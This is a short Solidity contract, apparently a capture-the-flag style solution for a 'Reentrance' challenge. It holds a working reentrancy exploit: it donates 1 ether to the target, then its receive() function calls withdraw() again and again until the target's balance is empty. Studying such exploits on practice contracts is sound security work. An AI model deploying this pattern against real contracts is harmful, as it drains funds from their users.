// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Reentrance.sol";

contract run_reentrance {
    Reentrance target;
    uint public amount = 1 ether;
    
    constructor(address payable _target) public payable {
        target = Reentrance(_target);
    }
    
    function deposit() public {
        target.donate{value:amount, gas:4000000}(address(this));
    }
    
    receive() external payable{
        if(address(target).balance != 0){
            target.withdraw(amount);
        }
    }
    
}